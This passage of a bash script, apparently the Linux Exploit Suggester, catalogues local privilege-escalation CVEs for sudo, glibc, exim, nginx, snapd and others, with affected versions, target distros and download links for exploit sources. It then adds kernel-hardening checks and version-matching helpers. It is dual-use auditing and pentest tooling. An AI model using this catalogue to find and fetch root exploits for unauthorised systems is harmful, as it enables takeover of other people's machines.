Comments: Distros use own versioning scheme. Manual verification needed.
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2016-1240 } ${XX} tomcat-rootprivesc-deb.sh
Reqs: pkg=tomcat
Tags: debian=8,ubuntu=16.04
Rank: 1
analysis-url: https://legalhackers.com/advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html
src-url: http://legalhackers.com/exploits/tomcat-rootprivesc-deb.sh
exploit-db: 40450
author: Dawid Golunski
Comments: Affects only Debian-based distros
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2016-1247 } ${XX} nginxed-root.sh
Reqs: pkg=nginx|nginx-full,ver<1.10.3
Tags: debian=8,ubuntu=14.04|16.04|16.10
Rank: 1
analysis-url: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
src-url: https://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh
exploit-db: 40768
author: Dawid Golunski
Comments: Rooting depends on cron.daily (up to 24h of delay). Affected: deb8: <1.6.2; 14.04: <1.4.6; 16.04: 1.10.0; gentoo: <1.10.2-r3
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2016-1531 } ${XX} perl_startup (exim)
Reqs: pkg=exim,ver<4.86.2
Tags: 
Rank: 1
analysis-url: http://www.exim.org/static/doc/CVE-2016-1531.txt
exploit-db: 39549
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2016-1531 } ${XX} perl_startup (exim) 2
Reqs: pkg=exim,ver<4.86.2
Tags: 
Rank: 1
analysis-url: http://www.exim.org/static/doc/CVE-2016-1531.txt
exploit-db: 39535
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2016-4989 } ${XX} setroubleshoot 2
Reqs: pkg=setroubleshoot
Tags: RHEL=6|7
Rank: 1
analysis-url: https://c-skills.blogspot.com/2016/06/lets-feed-attacker-input-to-sh-c-to-see.html
src-url: https://github.com/stealth/troubleshooter/raw/master/straight-shooter.c
exploit-db:
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2016-5425 } ${XX} tomcat-RH-root.sh
Reqs: pkg=tomcat
Tags: RHEL=7
Rank: 1
analysis-url: http://legalhackers.com/advisories/Tomcat-RedHat-Pkgs-Root-PrivEsc-Exploit-CVE-2016-5425.html
src-url: http://legalhackers.com/exploits/tomcat-RH-root.sh
exploit-db: 40488
author: Dawid Golunski
Comments: Affects only RedHat-based distros
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2016-6663,CVE-2016-6664|CVE-2016-6662 } ${XX} mysql-exploit-chain
Reqs: pkg=mysql-server|mariadb-server,ver<5.5.52
Tags: ubuntu=16.04.1
Rank: 1
analysis-url: https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html
src-url: http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c
exploit-db: 40678
author: Dawid Golunski
Comments: Also MariaDB ver<10.1.18 and ver<10.0.28 affected
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2016-9566 } ${XX} nagios-root-privesc
Reqs: pkg=nagios,ver<4.2.4
Tags:
Rank: 1
analysis-url: https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html
src-url: https://legalhackers.com/exploits/CVE-2016-9566/nagios-root-privesc.sh
exploit-db: 40921
author: Dawid Golunski
Comments: Allows priv escalation from nagios user or nagios group
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2017-0358 } ${XX} ntfs-3g-modprobe
Reqs: pkg=ntfs-3g,ver<2017.4
Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
Rank: 1
analysis-url: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
exploit-db: 41356
author: Jann Horn
Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2017-5899 } ${XX} s-nail-privget
Reqs: pkg=s-nail,ver<14.8.16
Tags: ubuntu=16.04,manjaro=16.10
Rank: 1
analysis-url: https://www.openwall.com/lists/oss-security/2017/01/27/7
src-url: https://www.openwall.com/lists/oss-security/2017/01/27/7/1
ext-url: https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2017-5899/exploit.sh
author: wapiflapi (orginal exploit author); Brendan Coles (author of exploit update at 'ext-url')
Comments: Distros use own versioning scheme. Manual verification needed.
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2017-1000367 } ${XX} Sudoer-to-root
Reqs: pkg=sudo,ver<=1.8.20,cmd:[ -f /usr/sbin/getenforce ]
Tags: RHEL=7{sudo:1.8.6p7}
Rank: 1
analysis-url: https://www.sudo.ws/alerts/linux_tty.html
src-url: https://www.qualys.com/2017/05/30/cve-2017-1000367/linux_sudo_cve-2017-1000367.c
exploit-db: 42183
author: Qualys
Comments: Needs to be sudoer. Works only on SELinux enabled systems
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2017-1000367 } ${XX} sudopwn
Reqs: pkg=sudo,ver<=1.8.20,cmd:[ -f /usr/sbin/getenforce ]
Tags:
Rank: 1
analysis-url: https://www.sudo.ws/alerts/linux_tty.html
src-url: https://raw.githubusercontent.com/c0d3z3r0/sudo-CVE-2017-1000367/master/sudopwn.c
exploit-db:
author: c0d3z3r0
Comments: Needs to be sudoer. Works only on SELinux enabled systems
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2017-1000366,CVE-2017-1000370 } ${XX} linux_ldso_hwcap
Reqs: pkg=glibc|libc6,ver<=2.25,x86
Tags:
Rank: 1
analysis-url: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
src-url: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap.c
exploit-db: 42274
author: Qualys
Comments: Uses "Stack Clash" technique, works against most SUID-root binaries
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2017-1000366,CVE-2017-1000371 } ${XX} linux_ldso_dynamic
Reqs: pkg=glibc|libc6,ver<=2.25,x86
Tags: debian=9|10,ubuntu=14.04.5|16.04.2|17.04,fedora=23|24|25
Rank: 1
analysis-url: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
src-url: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_dynamic.c
exploit-db: 42276
author: Qualys
Comments: Uses "Stack Clash" technique, works against most SUID-root PIEs
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2017-1000366,CVE-2017-1000379 } ${XX} linux_ldso_hwcap_64
Reqs: pkg=glibc|libc6,ver<=2.25,x86_64
Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
Rank: 1
analysis-url: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
src-url: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
exploit-db: 42275
author: Qualys
Comments: Uses "Stack Clash" technique, works against most SUID-root binaries
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2017-1000370,CVE-2017-1000371 } ${XX} linux_offset2lib
Reqs: pkg=glibc|libc6,ver<=2.25,x86
Tags:
Rank: 1
analysis-url: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
src-url: https://www.qualys.com/2017/06/19/stack-clash/linux_offset2lib.c
exploit-db: 42273
author: Qualys
Comments: Uses "Stack Clash" technique
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2018-1000001 } ${XX} RationalLove
Reqs: pkg=glibc|libc6,ver<2.27,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1,x86_64
Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
Rank: 1
analysis-url: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
src-url: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
Comments: kernel.unprivileged_userns_clone=1 required
bin-url: https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/cve-2018-1000001/RationalLove
exploit-db: 43775
author: halfdog
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2018-10900 } ${XX} vpnc_privesc.py
Reqs: pkg=networkmanager-vpnc|network-manager-vpnc,ver<1.2.6
Tags: ubuntu=16.04{network-manager-vpnc:1.1.93-1},debian=9.0{network-manager-vpnc:1.2.4-4},manjaro=17
Rank: 1
analysis-url: https://pulsesecurity.co.nz/advisories/NM-VPNC-Privesc
src-url: https://bugzilla.novell.com/attachment.cgi?id=779110
exploit-db: 45313
author: Denis Andzakovic
Comments: Distros use own versioning scheme. Manual verification needed.
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2018-14665 } ${XX} raptor_xorgy
Reqs: pkg=xorg-x11-server-Xorg,cmd:[ -u /usr/bin/Xorg ]
Tags: centos=7.4
Rank: 1
analysis-url: https://www.securepatterns.com/2018/10/cve-2018-14665-xorg-x-server.html
exploit-db: 45922
author: raptor
Comments: X.Org Server before 1.20.3 is vulnerable. Distros use own versioning scheme. Manual verification needed.
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2019-7304 } ${XX} dirty_sock
Reqs: pkg=snapd,ver<2.37,cmd:[ -S /run/snapd.socket ]
Tags: ubuntu=18.10,mint=19
Rank: 1
analysis-url: https://initblog.com/2019/dirty-sock/
exploit-db: 46361
exploit-db: 46362
src-url: https://github.com/initstring/dirty_sock/archive/master.zip
author: InitString
Comments: Distros use own versioning scheme. Manual verification needed.
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2019-10149 } ${XX} raptor_exim_wiz
Reqs: pkg=exim|exim4,ver>=4.87,ver<=4.91
Tags:
Rank: 1
analysis-url: https://www.qualys.com/2019/06/05/cve-2019-10149/return-wizard-rce-exim.txt
exploit-db: 46996
author: raptor
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2019-12181 } ${XX} Serv-U FTP Server
Reqs: cmd:[ -u /usr/local/Serv-U/Serv-U ]
Tags: debian=9
Rank: 1
analysis-url: https://blog.vastart.dev/2019/06/cve-2019-12181-serv-u-exploit-writeup.html
exploit-db: 47009
src-url: https://raw.githubusercontent.com/guywhataguy/CVE-2019-12181/master/servu-pe-cve-2019-12181.c
ext-url: https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-12181/SUroot
author: Guy Levin (orginal exploit author); Brendan Coles (author of exploit update at 'ext-url')
Comments: Modified version at 'ext-url' uses bash exec technique, rather than compiling with gcc.
EOF
)
EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2019-18862 } ${XX} GNU Mailutils 2.0 <= 3.7 maidag url local root (CVE-2019-18862)
Reqs: cmd:[ -u /usr/local/sbin/maidag ]
Tags: 
Rank: 1
analysis-url: https://www.mike-gualtieri.com/posts/finding-a-decade-old-flaw-in-gnu-mailutils
ext-url: https://github.com/bcoles/local-exploits/raw/master/CVE-2019-18862/exploit.cron.sh
src-url: https://github.com/bcoles/local-exploits/raw/master/CVE-2019-18862/exploit.ldpreload.sh
author: bcoles
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2019-18634 } ${XX} sudo pwfeedback
Reqs: pkg=sudo,ver<1.8.31
Tags: mint=19
Rank: 1
analysis-url: https://dylankatz.com/Analysis-of-CVE-2019-18634/
src-url: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
author: saleemrashid
Comments: sudo configuration requires pwfeedback to be enabled.
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2020-9470 } ${XX} Wing FTP Server <= 6.2.5 LPE
Reqs: cmd:[ -x /etc/init.d/wftpserver ]
Tags: ubuntu=18
Rank: 1
analysis-url: https://www.hooperlabs.xyz/disclosures/cve-2020-9470.php
src-url: https://www.hooperlabs.xyz/disclosures/cve-2020-9470.sh
exploit-db: 48154
author: Cary Cooper
Comments: Requires an administrator to login via the web interface.
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2021-3156 } ${XX} sudo Baron Samedit
Reqs: pkg=sudo,ver<1.9.5p2
Tags: mint=19,ubuntu=18|20, debian=10
Rank: 1
analysis-url: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
src-url: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
author: blasty
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2021-3156 } ${XX} sudo Baron Samedit 2
Reqs: pkg=sudo,ver<1.9.5p2
Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
Rank: 1
analysis-url: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
src-url: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
author: worawit
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${GREEN}   ══{ CVE-2017-5618 } ${XX} setuid screen v4.5.0 LPE
Reqs: pkg=screen,ver==4.5.0
Tags: 
Rank: 1
analysis-url: https://seclists.org/oss-sec/2017/q1/184
exploit-db: https://www.exploit-db.com/exploits/41154
EOF
)

n=0

FEATURES[((n++))]=$(cat <<EOF
section: Mainline kernel protection mechanisms:
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Kernel Page Table Isolation (PTI) support
available: ver>=4.15
enabled: cmd:grep -Eqi '\spti' /proc/cpuinfo
analysis-url: https://github.com/mzet-/les-res/blob/master/features/pti.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: GCC stack protector support
available: CONFIG_HAVE_STACKPROTECTOR=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/stackprotector-regular.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: GCC stack protector STRONG support
available: CONFIG_STACKPROTECTOR_STRONG=y,ver>=3.14
analysis-url: https://github.com/mzet-/les-res/blob/master/features/stackprotector-strong.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Low address space to protect from user allocation
available: CONFIG_DEFAULT_MMAP_MIN_ADDR=[0-9]+
enabled: sysctl:vm.mmap_min_addr!=0
analysis-url: https://github.com/mzet-/les-res/blob/master/features/mmap_min_addr.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Prevent users from using ptrace to examine the memory and state of their processes
available: CONFIG_SECURITY_YAMA=y
enabled: sysctl:kernel.yama.ptrace_scope!=0
analysis-url: https://github.com/mzet-/les-res/blob/master/features/yama_ptrace_scope.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Restrict unprivileged access to kernel syslog
available: CONFIG_SECURITY_DMESG_RESTRICT=y,ver>=2.6.37
enabled: sysctl:kernel.dmesg_restrict!=0
analysis-url: https://github.com/mzet-/les-res/blob/master/features/dmesg_restrict.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Randomize the address of the kernel image (KASLR)
available: CONFIG_RANDOMIZE_BASE=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/kaslr.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Hardened user copy support
available: CONFIG_HARDENED_USERCOPY=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/hardened_usercopy.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Make kernel text and rodata read-only
available: CONFIG_STRICT_KERNEL_RWX=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/strict_kernel_rwx.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Set loadable kernel module data as NX and text as RO
available: CONFIG_STRICT_MODULE_RWX=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/strict_module_rwx.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: BUG() conditions reporting
available: CONFIG_BUG=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/bug.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Additional 'cred' struct checks
available: CONFIG_DEBUG_CREDENTIALS=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/debug_credentials.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Sanity checks for notifier call chains
available: CONFIG_DEBUG_NOTIFIERS=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/debug_notifiers.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Extended checks for linked-lists walking
available: CONFIG_DEBUG_LIST=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/debug_list.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Checks on scatter-gather tables
available: CONFIG_DEBUG_SG=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/debug_sg.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Checks for data structure corruptions
available: CONFIG_BUG_ON_DATA_CORRUPTION=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/bug_on_data_corruption.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Checks for a stack overrun on calls to 'schedule'
available: CONFIG_SCHED_STACK_END_CHECK=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/sched_stack_end_check.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Freelist order randomization on new pages creation
available: CONFIG_SLAB_FREELIST_RANDOM=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/slab_freelist_random.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Freelist metadata hardening
available: CONFIG_SLAB_FREELIST_HARDENED=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/slab_freelist_hardened.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Allocator validation checking
available: CONFIG_SLUB_DEBUG_ON=y,cmd:! grep 'slub_debug=-' /proc/cmdline
analysis-url: https://github.com/mzet-/les-res/blob/master/features/slub_debug.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Virtually-mapped kernel stacks with guard pages
available: CONFIG_VMAP_STACK=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/vmap_stack.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Pages poisoning after free_pages() call
available: CONFIG_PAGE_POISONING=y
enabled: cmd: grep 'page_poison=1' /proc/cmdline
analysis-url: https://github.com/mzet-/les-res/blob/master/features/page_poisoning.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Using 'refcount_t' instead of 'atomic_t'
available: CONFIG_REFCOUNT_FULL=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/refcount_full.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Hardening common str/mem functions against buffer overflows
available: CONFIG_FORTIFY_SOURCE=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/fortify_source.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Restrict /dev/mem access
available: CONFIG_STRICT_DEVMEM=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/strict_devmem.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Restrict I/O access to /dev/mem
available: CONFIG_IO_STRICT_DEVMEM=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/io_strict_devmem.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
section: Hardware-based protection features:
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Supervisor Mode Execution Protection (SMEP) support
available: ver>=3.0
enabled: cmd:grep -qi smep /proc/cpuinfo
analysis-url: https://github.com/mzet-/les-res/blob/master/features/smep.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Supervisor Mode Access Prevention (SMAP) support
available: ver>=3.7
enabled: cmd:grep -qi smap /proc/cpuinfo
analysis-url: https://github.com/mzet-/les-res/blob/master/features/smap.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
section: 3rd party kernel protection mechanisms:
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Grsecurity
available: CONFIG_GRKERNSEC=y
enabled: cmd:test -c /dev/grsec
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: PaX
available: CONFIG_PAX=y
enabled: cmd:test -x /sbin/paxctl
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Linux Kernel Runtime Guard (LKRG) kernel module
enabled: cmd:test -d /proc/sys/lkrg
analysis-url: https://github.com/mzet-/les-res/blob/master/features/lkrg.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
section: Attack Surface:
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: User namespaces for unprivileged accounts
available: CONFIG_USER_NS=y
enabled: sysctl:kernel.unprivileged_userns_clone==1
analysis-url: https://github.com/mzet-/les-res/blob/master/features/user_ns.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Unprivileged access to bpf() system call
available: CONFIG_BPF_SYSCALL=y
enabled: sysctl:kernel.unprivileged_bpf_disabled!=1
analysis-url: https://github.com/mzet-/les-res/blob/master/features/bpf_syscall.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Syscalls filtering
available: CONFIG_SECCOMP=y
enabled: cmd:grep -i Seccomp /proc/self/status | awk '{print \$2}'
analysis-url: https://github.com/mzet-/les-res/blob/master/features/bpf_syscall.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Support for /dev/mem access
available: CONFIG_DEVMEM=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/devmem.md
EOF
)

FEATURES[((n++))]=$(cat <<EOF
feature: Support for /dev/kmem access
available: CONFIG_DEVKMEM=y
analysis-url: https://github.com/mzet-/les-res/blob/master/features/devkmem.md
EOF
)
    parseUname() {
        local uname=$1
        KERNEL=$(echo "$uname" | awk '{print $3}' | cut -d '-' -f 1)
        KERNEL_ALL=$(echo "$uname" | awk '{print $3}')
        ARCH=$(echo "$uname" | awk '{print $(NF-1)}')
        OS=""
        echo "$uname" | grep -q -i 'deb' && OS="debian"
        echo "$uname" | grep -q -i 'ubuntu' && OS="ubuntu"
        echo "$uname" | grep -q -i '\-ARCH' && OS="arch"
        echo "$uname" | grep -q -i '\-deepin' && OS="deepin"
        echo "$uname" | grep -q -i '\-MANJARO' && OS="manjaro"
        echo "$uname" | grep -q -i '\.fc' && OS="fedora"
        echo "$uname" | grep -q -i '\.el' && OS="RHEL"
        echo "$uname" | grep -q -i '\.mga' && OS="mageia"
    }
    getPkgList() {
        local distro=$1
        local pkglist_file=$2
        if [ "$opt_pkglist_file" = "true" -a -e "$pkglist_file" ]; 
        then
            if [ $(head -1 "$pkglist_file" | grep 'Desired=Unknown/Install/Remove/Purge/Hold') ]; 
            then
                PKG_LIST=$(cat "$pkglist_file" | awk '{print $2"-"$3}' | sed 's/:amd64//g')
                OS="debian"
                [ "$(grep ubuntu "$pkglist_file")" ] && OS="ubuntu"
            elif [ "$(grep -E '\.el[1-9]+[\._]' "$pkglist_file" | head -1)" ]; 
            then
                PKG_LIST=$(cat "$pkglist_file")
                OS="RHEL"
            elif [ "$(grep -E '\.fc[1-9]+'i "$pkglist_file" | head -1)" ]; 
            then
                PKG_LIST=$(cat "$pkglist_file")
                OS="fedora"
            elif [ "$(grep -E '\.mga[1-9]+' "$pkglist_file" | head -1)" ]; 
            then
                PKG_LIST=$(cat "$pkglist_file")
                OS="mageia"
            elif [ "$(grep -E '\ [0-9]+\.' "$pkglist_file" | head -1)" ]; 
            then
                PKG_LIST=$(cat "$pkglist_file" | awk '{print $1"-"$2}')
                OS="arch"
            else
                PKG_LIST=""
            fi
        elif [ "$distro" = "debian" -o "$distro" = "ubuntu" -o "$distro" = "deepin" ]; 
        then
            PKG_LIST=$(dpkg -l | awk '{print $2"-"$3}' | sed 's/:amd64//g')
        elif [ "$distro" = "RHEL" -o "$distro" = "fedora" -o "$distro" = "mageia" ];
        then
            PKG_LIST=$(rpm -qa)
        elif [ "$distro" = "arch" -o "$distro" = "manjaro" ]; 
        then
            PKG_LIST=$(pacman -Q | awk '{print $1"-"$2}')
        elif [ -x /usr/bin/equery ]; 
        then
            PKG_LIST=$(/usr/bin/equery --quiet list '*' -F '$name:$version' | cut -d/ -f2- | awk '{print $1":"$2}')
        else
            PKG_LIST=""
        fi
    }
    verComparision() {
        if [[ $1 == $2 ]]
        then
            return 0
        fi
        local IFS=.
        local i ver1=($1) ver2=($2)
        for ((i=${#ver1[@]}; i<${#ver2[@]}; i++))
        do
            ver1[i]=0
        done
        for ((i=0; i<${#ver1[@]}; i++))
        do
            if [[ -z ${ver2[i]} ]]
            then
                ver2[i]=0
            fi
            if ((10#${ver1[i]} > 10#${ver2[i]}))
            then
                return 1
            fi
            if ((10#${ver1[i]} < 10#${ver2[i]}))
            then
                return 2
            fi
        done
        return 0
    }
    doVersionComparision() {
        local reqVersion="$1"
        local reqRelation="$2"
        local currentVersion="$3"
        verComparision $currentVersion $reqVersion
        case $? in
            0) currentRelation='=';;
            1) currentRelation='>';;
            2) currentRelation='<';;
        esac
        if [ "$reqRelation" == "=" ]; then
            [ $currentRelation == "=" ] && return 0
        elif [ "$reqRelation" == ">" ]; then
            [ $currentRelation == ">" ] && return 0
        elif [ "$reqRelation" == "<" ]; then
            [ $currentRelation == "<" ] && return 0
        elif [ "$reqRelation" == ">=" ]; then
            [ $currentRelation == "=" ] && return 0
            [ $currentRelation == ">" ] && return 0
        elif [ "$reqRelation" == "<=" ]; then
            [ $currentRelation == "=" ] && return 0
            [ $currentRelation == "<" ] && return 0
        fi
    }
    compareValues() {
        curVal=$1
        val=$2
        sign=$3
        if [ "$sign" == "==" ]; then
            [ "$val" == "$curVal" ] && return 0
        elif [ "$sign" == "!=" ]; then
            [ "$val" != "$curVal" ] && return 0
        fi
        return 1
    }
    checkRequirement() {
        local IN="$1"
        local pkgName="${2:4}"
        if [[ "$IN" =~ ^pkg=.*$ ]]; 
        then
            [ ${pkgName} == "linux-kernel" ] && return 0
            pkg=$(echo "$PKG_LIST" | grep -E -i "^$pkgName-[0-9]+" | head -1)
            if [ -n "$pkg" ]; 
            then
                return 0
            fi
        elif [[ "$IN" =~ ^ver.*$ ]]; 
        then
            version="${IN//[^0-9.]/}"
            rest="${IN#ver}"
            operator=${rest%$version}
            if [ "$pkgName" == "linux-kernel" -o "$opt_checksec_mode" == "true" ]; 
            then
                [ "$opt_cvelist_file" = "true" ] && return 0
                doVersionComparision $version $operator $KERNEL && return 0
            else
                pkg=$(echo "$PKG_LIST" | grep -E -i "^$pkgName-[0-9]+" | head -1)
                [ "$opt_skip_pkg_versions" = "true" -a -n "$pkg" ] && return 0
                pkgVersion=$(echo "$pkg" | grep -E -i -o -e '-[\.0-9\+:p]+[-\+]' | cut -d':' -f2 | sed 's/[\+-]//g' | sed 's/p[0-9]//g')
                doVersionComparision $version $operator $pkgVersion && return 0
            fi
        elif [[ "$IN" =~ ^x86_64$ ]] && [ "$ARCH" == "x86_64" -o "$ARCH" == "" ]; 
        then
            return 0
        elif [[ "$IN" =~ ^x86$ ]] && [ "$ARCH" == "i386" -o "$ARCH" == "i686" -o "$ARCH" == "" ]; 
        then
            return 0
        elif [[ "$IN" =~ ^CONFIG_.*$ ]]; 
        then
            [ "$opt_skip_more_checks" = "true" ] && return 0
            if [ -n "$KCONFIG" ]; 
            then
                if $KCONFIG | grep -E -qi $IN; 
                then
                    return 0;
                else
                    return 1;
                fi
            else
                return 0;
            fi
        elif [[ "$IN" =~ ^sysctl:.*$ ]]; 
        then
            [ "$opt_skip_more_checks" = "true" ] && return 0
            sysctlCondition="${IN:7}"
            if echo $sysctlCondition | grep -qi "!="; 
            then
                sign="!="
            elif echo $sysctlCondition | grep -qi "=="; 
            then
                sign="=="
            else
                exitWithErrMsg "Wrong sysctl condition. There is syntax error in your features DB. Aborting."
            fi
            val=$(echo "$sysctlCondition" | awk -F "$sign" '{print $2}')
            entry=$(echo "$sysctlCondition" | awk -F "$sign" '{print $1}')
            curVal=$(/sbin/sysctl -a 2>/dev/null | grep "$entry" | awk -F'=' '{print $2}')
            [ -z "$curVal" -a "$opt_checksec_mode" = "true" ] && return 2
            [ -z "$curVal" ] && return 0
            compareValues $curVal $val $sign && return 0
        elif [[ "$IN" =~ ^cmd:.*$ ]]; 
        then
            [ "$opt_skip_more_checks" = "true" ] && return 0
